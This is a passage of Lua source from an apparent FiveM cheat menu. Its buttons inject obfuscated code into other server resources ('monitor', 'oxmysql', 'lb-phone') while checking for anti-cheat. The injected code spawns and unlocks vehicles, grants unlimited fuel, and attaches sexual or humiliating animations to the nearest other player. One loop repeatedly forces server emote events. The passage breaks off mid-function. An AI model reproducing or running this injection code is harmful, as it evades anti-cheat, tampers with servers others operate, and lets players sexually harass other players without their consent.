            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                VkLpOiUyTrEq = false
            ]])
        end)

        MachoMenuCheckbox(VehicleTabSections[1], "Unlimited Fuel", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                BlNkJmLzXcVb = true

                local function LqWyXpR3tV()
                    local TmPlKoMiJnBg = CreateThread
                    local ZxCvBnMaSdFg = PlayerPedId
                    local YhUjIkOlPlMn = IsPedInAnyVehicle
                    local VcXzQwErTyUi = GetVehiclePedIsIn
                    local KpLoMkNjBhGt = DoesEntityExist
                    local JkLzXcVbNmAs = SetVehicleFuelLevel

                    TmPlKoMiJnBg(function()
                        while BlNkJmLzXcVb and not Unloaded do
                            local ped = ZxCvBnMaSdFg()
                            if YhUjIkOlPlMn(ped, false) then
                                local veh = VcXzQwErTyUi(ped, false)
                                if KpLoMkNjBhGt(veh) then
                                    JkLzXcVbNmAs(veh, 100.0)
                                end
                            end
                            Wait(100)
                        end
                    end)
                end

                LqWyXpR3tV()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                BlNkJmLzXcVb = false
            ]])
        end)

        local LicensePlateHandle = MachoMenuInputbox(VehicleTabSections[2], "License Plate:", "...")
        MachoMenuButton(VehicleTabSections[2], "Set License Plate", function()
            local LicensePlate = MachoMenuGetInputbox(LicensePlateHandle)

            if type(LicensePlate) == "string" and LicensePlate ~= "" then
                local injectedCode = string.format([[
                    local function xKqLZVwPt9()
                        local XcVbNmAsDfGhJkL = PlayerPedId
                        local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                        local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                        local pEd = XcVbNmAsDfGhJkL()
                        local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                        if vEh and vEh ~= 0 then
                            PoIuYtReWqAzXsDc(vEh, "%s")
                        end

                    end

                    xKqLZVwPt9()
                ]], LicensePlate)

                MachoInjectResource(CheckResource("monitor") and "monitor" or "any", injectedCode)
            end
        end)

        local VehicleSpawnerBox = MachoMenuInputbox(VehicleTabSections[2], "Vehicle Model:", "...")
        MachoMenuButton(VehicleTabSections[2], "Spawn Car", function()
            local VehicleModel = MachoMenuGetInputbox(VehicleSpawnerBox)

            local waveShieldRunning = GetResourceState("WaveShield") == "started"
            local lbPhoneRunning = GetResourceState("lb-phone") == "started"

            local injectedCode

            if not waveShieldRunning and lbPhoneRunning then
                injectedCode = ([[ 
                    if type(CreateFrameworkVehicle) == "function" then
                        local model = "%s"
                        local hash = GetHashKey(model)
                        local ped = PlayerPedId()
                        if DoesEntityExist(ped) then
                            local coords = GetEntityCoords(ped)
                            if coords then
                                local vehicleData = {
                                    vehicle = json.encode({ model = model })
                                }
                                CreateFrameworkVehicle(vehicleData, coords)
                            end
                        end
                    end
                ]]):format(VehicleModel)

                MachoInjectResource("lb-phone", injectedCode)

            else
                injectedCode = ([[ 
                    local function XzRtVbNmQwEr()
                        local tYaPlXcUvBn = PlayerPedId
                        local iKoMzNbHgTr = GetEntityCoords
                        local wErTyUiOpAs = GetEntityHeading
                        local hGtRfEdCvBg = RequestModel
                        local bNjMkLoIpUh = HasModelLoaded
                        local pLkJhGfDsAq = Wait
                        local sXcVbNmZlQw = GetVehiclePedIsIn
                        local yUiOpAsDfGh = DeleteVehicle
                        local aSxDcFgHvBn = _G.CreateVehicle
                        local oLpKjHgFdSa = NetworkGetNetworkIdFromEntity
                        local zMxNaLoKvRe = SetEntityAsMissionEntity
                        local mVbGtRfEdCv = SetVehicleOutOfControl
                        local eDsFgHjKlQw = SetVehicleHasBeenOwnedByPlayer
                        local lAzSdXfCvBg = SetNetworkIdExistsOnAllMachines
                        local nMqWlAzXcVb = NetworkSetEntityInvisibleToNetwork
                        local vBtNrEuPwOa = SetNetworkIdCanMigrate
                        local gHrTyUjLoPk = SetModelAsNoLongerNeeded
                        local kLoMnBvCxZq = TaskWarpPedIntoVehicle

                        local bPeDrTfGyHu = tYaPlXcUvBn()
                        local cFiGuHvYbNj = iKoMzNbHgTr(bPeDrTfGyHu)
                        local jKgHnJuMkLp = wErTyUiOpAs(bPeDrTfGyHu)
                        local nMiLoPzXwEq = "%s"

                        hGtRfEdCvBg(nMiLoPzXwEq)
                        while not bNjMkLoIpUh(nMiLoPzXwEq) do
                            pLkJhGfDsAq(100)
                        end

                        local fVbGtFrEdSw = sXcVbNmZlQw(bPeDrTfGyHu, false)
                        if fVbGtFrEdSw and fVbGtFrEdSw ~= 0 then
                            yUiOpAsDfGh(fVbGtFrEdSw)
                        end

                        local xFrEdCvBgTn = aSxDcFgHvBn(nMiLoPzXwEq, cFiGuHvYbNj.x + 2.5, cFiGuHvYbNj.y, cFiGuHvYbNj.z, jKgHnJuMkLp, true, false)
                        local sMnLoKiJpUb = oLpKjHgFdSa(xFrEdCvBgTn)

                        zMxNaLoKvRe(xFrEdCvBgTn, true, true)
                        mVbGtRfEdCv(xFrEdCvBgTn, false, false)
                        eDsFgHjKlQw(xFrEdCvBgTn, false)
                        lAzSdXfCvBg(sMnLoKiJpUb, true)
                        nMqWlAzXcVb(xFrEdCvBgTn, false)
                        vBtNrEuPwOa(sMnLoKiJpUb, true)
                        gHrTyUjLoPk(nMiLoPzXwEq)

                        kLoMnBvCxZq(bPeDrTfGyHu, xFrEdCvBgTn, -1)
                    end

                    XzRtVbNmQwEr()
                ]]):format(VehicleModel)

                MachoInjectResource(CheckResource("monitor") and "monitor" or "any", injectedCode)
            end
        end)

        MachoMenuButton(VehicleTabSections[3], "Repair Vehicle", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function FgN7LqxZyP()
                    local aBcD = PlayerPedId
                    local eFgH = GetVehiclePedIsIn
                    local iJkL = SetVehicleFixed
                    local mNoP = SetVehicleDeformationFixed

                    local p = aBcD()
                    local v = eFgH(p, false)
                    if v and v ~= 0 then
                        iJkL(v)
                        mNoP(v)
                    end
                end

                FgN7LqxZyP()
            ]])
        end)

        MachoMenuButton(VehicleTabSections[3], "Flip Vehicle", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function vXmYLT9pq2()
                    local a = PlayerPedId
                    local b = GetVehiclePedIsIn
                    local c = GetEntityHeading
                    local d = SetEntityRotation

                    local ped = a()
                    local veh = b(ped, false)
                    if veh and veh ~= 0 then
                        d(veh, 0.0, 0.0, c(veh))
                    end
                end

                vXmYLT9pq2()
            ]])
        end)

        MachoMenuButton(VehicleTabSections[3], "Clean Vehicle", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function qPwRYKz7mL()
                    local a = PlayerPedId
                    local b = GetVehiclePedIsIn
                    local c = SetVehicleDirtLevel

                    local ped = a()
                    local veh = b(ped, false)
                    if veh and veh ~= 0 then
                        c(veh, 0.0)
                    end
                end

                qPwRYKz7mL()
            ]])
        end)

        MachoMenuButton(VehicleTabSections[3], "Delete Vehicle", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function LXpTqWvR80()
                    local aQw = PlayerPedId
                    local bEr = GetVehiclePedIsIn
                    local cTy = DoesEntityExist
                    local dUi = NetworkHasControlOfEntity
                    local eOp = SetEntityAsMissionEntity
                    local fAs = DeleteEntity
                    local gDf = DeleteVehicle
                    local hJk = SetVehicleHasBeenOwnedByPlayer

                    local ped = aQw()
                    local veh = bEr(ped, false)

                    if veh and veh ~= 0 and cTy(veh) then
                        hJk(veh, true)
                        eOp(veh, true, true)

                        if dUi(veh) then
                            fAs(veh)
                            gDf(veh)
                        end
                    end

                end

                LXpTqWvR80()
            ]])
        end)

        MachoMenuButton(VehicleTabSections[3], "Toggle Vehicle Engine", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function NKzqVoXYLm()
                    local a = PlayerPedId
                    local b = GetVehiclePedIsIn
                    local c = GetIsVehicleEngineRunning
                    local d = SetVehicleEngineOn

                    local ped = a()
                    local veh = b(ped, false)
                    if veh and veh ~= 0 then
                        if c(veh) then
                            d(veh, false, true, true)
                        else
                            d(veh, true, true, false)
                        end
                    end
                end

                NKzqVoXYLm()
            ]])
        end)

        MachoMenuButton(VehicleTabSections[3], "Max Vehicle Upgrades", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function XzPmLqRnWyBtVkGhQe()
                    local FnUhIpOyLkTrEzSd = PlayerPedId
                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                    local QwErTyUiOpAsDfGh = SetVehicleMod
                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                    for XyZoPqRtWnEsDfGh = 0, 16 do
                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                        end
                    end

                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                    end

                    for QeTrBnMkOjHuYgFv = 17, 22 do
                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                    end

                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                    for TpYuIoPlMnBvCxZq = 1, 12 do
                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                        end
                    end

                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                end

                XzPmLqRnWyBtVkGhQe()
            ]])
        end)

        MachoMenuButton(VehicleTabSections[3], "Teleport into Closest Vehicle", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function uPKcoBaEHmnK()
                    local ziCFzHyzxaLX = SetPedIntoVehicle
                    local YPPvDlOGBghA = GetClosestVehicle

                    local Coords = GetEntityCoords(PlayerPedId())
                    local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                    if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                        if GetPedInVehicleSeat(vehicle, -1) == 0 then
                            ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                        else
                            ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                        end
                    end
                end

                uPKcoBaEHmnK()
            ]])
        end)

        MachoMenuButton(VehicleTabSections[3], "Unlock Closest Vehicle", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function TpLMqKtXwZ()
                    local AsoYuTrBnMvCxZaQw = PlayerPedId
                    local GhrTnLpKjUyVbMnZx = GetEntityCoords
                    local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                    local ZmkLpQwErTyUiOpAs = DoesEntityExist
                    local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                    local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                    local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                    local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                    local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                    local ped = AsoYuTrBnMvCxZaQw()
                    local coords = GhrTnLpKjUyVbMnZx(ped)
                    local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                    if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                        VczNmLoJhBgVfCdEx(veh, true, true)
                        RtYuIoPlMnBvCxZaSd(veh, true)
                        EqWoXyBkVsNzQuH(veh, 1)
                        YxZwQvTrBnMaSdFgHj(veh, false)
                    end

                end

                TpLMqKtXwZ()
            ]])
        end)

        MachoMenuButton(VehicleTabSections[3], "Lock Closest Vehicle", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function tRYpZvKLxQ()
                    local WqEoXyBkVsNzQuH = PlayerPedId
                    local LoKjBtWxFhPoZuR = GetEntityCoords
                    local VbNmAsDfGhJkLzXcVb = GetClosestVehicle
                    local TyUiOpAsDfGhJkLzXc = DoesEntityExist
                    local PlMnBvCxZaSdFgTrEq = SetEntityAsMissionEntity
                    local KjBtWxFhPoZuRZlK = SetVehicleHasBeenOwnedByPlayer
                    local AsDfGhJkLzXcVbNmQwE = SetVehicleDoorsLocked
                    local QwEoXyBkVsNzQuHL = SetVehicleDoorsLockedForAllPlayers
                    local ZxCvBnMaSdFgTrEqWz = NetworkHasControlOfEntity

                    local ped = WqEoXyBkVsNzQuH()
                    local coords = LoKjBtWxFhPoZuR(ped)
                    local veh = VbNmAsDfGhJkLzXcVb(coords.x, coords.y, coords.z, 10.0, 0, 70)

                    if veh and TyUiOpAsDfGhJkLzXc(veh) and ZxCvBnMaSdFgTrEqWz(veh) then
                        PlMnBvCxZaSdFgTrEq(veh, true, true)
                        KjBtWxFhPoZuRZlK(veh, true)
                        AsDfGhJkLzXcVbNmQwE(veh, 2)
                        QwEoXyBkVsNzQuHL(veh, true)
                    end
                end

                tRYpZvKLxQ()
            ]])
        end)

        -- Emote Tab
        MachoMenuButton(EmoteTabSections[1], "Force Emotes [Be careful]", function()
            MachoInjectResource(
                CheckResource("monitor") and "monitor" 
                or CheckResource("oxmysql") and "oxmysql" 
                or "any", [[
                Citizen.CreateThread(function()
            local playerPed = PlayerPedId()
            local playerId = GetPlayerServerId(PlayerId())

            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
            Citizen.Wait(20000)
            TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        end)
            ]])
        end)
        
        MachoMenuButton(EmoteTabSections[1], "Detach All Entitys", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function zXqLJWt7pN()
                    local xPvA71LtqzW = ClearPedTasks
                    local bXcT2mpqR9f = DetachEntity

                    xPvA71LtqzW(PlayerPedId())
                    bXcT2mpqR9f(PlayerPedId())
                end

                zXqLJWt7pN()
            ]])
        end)

        MachoMenuButton(EmoteTabSections[1], "Twerk On Them", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function OyWTpKvmXq()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)
                    
                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)
                            
                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if StarkDaddy then
                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            StarkDaddy = false
                        else
                            StarkDaddy = true
                            if not HasAnimDictLoaded("switch@trevor@mocks_lapdance") then
                                RequestAnimDict("switch@trevor@mocks_lapdance")
                                while not HasAnimDictLoaded("switch@trevor@mocks_lapdance") do
                                    Wait(0)
                                end        
                            end

                            local targetPed = GetPlayerPed(closestPlayer)
                            AttachEntityToEntity(playerPed, targetPed, 4103, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                            TaskPlayAnim(playerPed, "switch@trevor@mocks_lapdance", "001443_01_trvs_28_idle_stripper", 8.0, -8.0, 100000, 33, 0, false, false, false)
                        end
                    end
                end

                OyWTpKvmXq()
            ]])
        end)

        MachoMenuButton(EmoteTabSections[1], "Give Them Backshots", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function bXzLqPTMn9()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if StarkDaddy then
                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            StarkDaddy = false
                        else
                            StarkDaddy = true
                            if not HasAnimDictLoaded("rcmpaparazzo_2") then
                                RequestAnimDict("rcmpaparazzo_2")
                                while not HasAnimDictLoaded("rcmpaparazzo_2") do
                                    Wait(0)
                                end
                            end

                            local targetPed = GetPlayerPed(closestPlayer)
                            AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.04, -0.4, 0.1, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                            TaskPlayAnim(PlayerPedId(), "rcmpaparazzo_2", "shag_loop_a", 8.0, -8.0, 100000, 33, 0, false, false, false)
                            TaskPlayAnim(GetPlayerPed(closestPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                        end
                    end
                end

                bXzLqPTMn9()
            ]])
        end)

        MachoMenuButton(EmoteTabSections[1], "Wank On Them", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function qXW7YpLtKv()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if isInPiggyBack then
                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            wankoffperson = false
                        else
                            wankoffperson = true
                            if not HasAnimDictLoaded("mp_player_int_upperwank") then
                                RequestAnimDict("mp_player_int_upperwank")
                                while not HasAnimDictLoaded("mp_player_int_upperwank") do
                                    Wait(0)
                                end
                            end
                        end

                        TaskPlayAnim(PlayerPedId(), "mp_player_int_upperwank", "mp_player_int_wank_01", 8.0, -8.0, -1, 51, 1.0, false, false, false)
                    end
                end

                qXW7YpLtKv()
            ]])
        end)

        MachoMenuButton(EmoteTabSections[1], "Piggyback On Player", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function RtKpqLmXZV()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if isInPiggyBack then
                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            isInPiggyBack = false
                        else
                            isInPiggyBack = true
                            if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
                                RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
                                while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                                    Wait(0)
                                end
                            end

                            local targetPed = GetPlayerPed(closestPlayer)
                            AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false, false, false, false, 2, false)
                            TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
                        end
                    end
                end

                RtKpqLmXZV()
            ]])
        end)

        MachoMenuButton(EmoteTabSections[1], "Blame Arrest", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function WXY7LpqKto()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if StarkCuff then
                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            StarkCuff = false
                        else
                            StarkCuff = true
                            if not HasAnimDictLoaded("mp_arresting") then
                                RequestAnimDict("mp_arresting")
                                while not HasAnimDictLoaded("mp_arresting") do
                                    Wait(0)
                                end
                            end

                            local targetPed = GetPlayerPed(closestPlayer)
                            AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.35, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                            TaskPlayAnim(PlayerPedId(), "mp_arresting", "idle", 8.0, -8, -1, 49, 0.0, false, false, false)
                        end
                    end
                end

                WXY7LpqKto()
            ]])
        end)

        MachoMenuButton(EmoteTabSections[1], "Blame Carry", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function KmXYpTzqLW()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if StarkCarry then
                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            StarkCarry = false
                        else
                            StarkCarry = true
                            if not HasAnimDictLoaded("nm") then
                                RequestAnimDict("nm")
                                while not HasAnimDictLoaded("nm") do
                                    Wait(0)
                                end
                            end

                            local targetPed = GetPlayerPed(closestPlayer)
                            AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                            TaskPlayAnim(PlayerPedId(), "nm", "firemans_carry", 8.0, -8.0, 100000, 33, 0, false, false, false)
                        end
                    end
                end

                KmXYpTzqLW()
            ]])
        end)

        MachoMenuButton(EmoteTabSections[1], "Sit On Them", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function PxKvqLtNYz()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") then
                        RequestAnimDict("anim@heists@prison_heistunfinished_biztarget_idle")
                        while not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") do
                            Wait(0)
                        end
                    end

                    AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 4103, 0.10, 0.28, 1.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                    TaskPlayAnim(PlayerPedId(), "anim@heists@prison_heistunfinished_biztarget_idle", "target_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
                    TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
                end

                PxKvqLtNYz()
            ]])
        end)

        MachoMenuButton(EmoteTabSections[1], "Ride Driver", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function vZqPWLXm97()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if RideDriver then
                            ClearPedSecondaryTask(playerPed)
                            DetachEntity(playerPed, true, false)
                            RideDriver = false
                        else
                            RideDriver = true
                            if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                                RequestAnimDict("mini@prostitutes@sexnorm_veh")
                                while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                                    Wait(0)
                                end
                            end

                            local targetPed = GetPlayerPed(closestPlayer)
                            AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                            TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "sex_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                        end
                    end
                end

                vZqPWLXm97()
            ]])
        end)

        MachoMenuButton(EmoteTabSections[1], "Blow Driver", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function qPLWtXYzKm()
                    local closestPlayer, closestDistance = nil, math.huge
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)

                    for _, playerId in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(playerId)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local distance = #(playerCoords - targetCoords)

                            if distance < closestDistance then
                                closestDistance = distance
                                closestPlayer = playerId
                            end
                        end
                    end

                    if closestPlayer then
                        if BlowDriver then
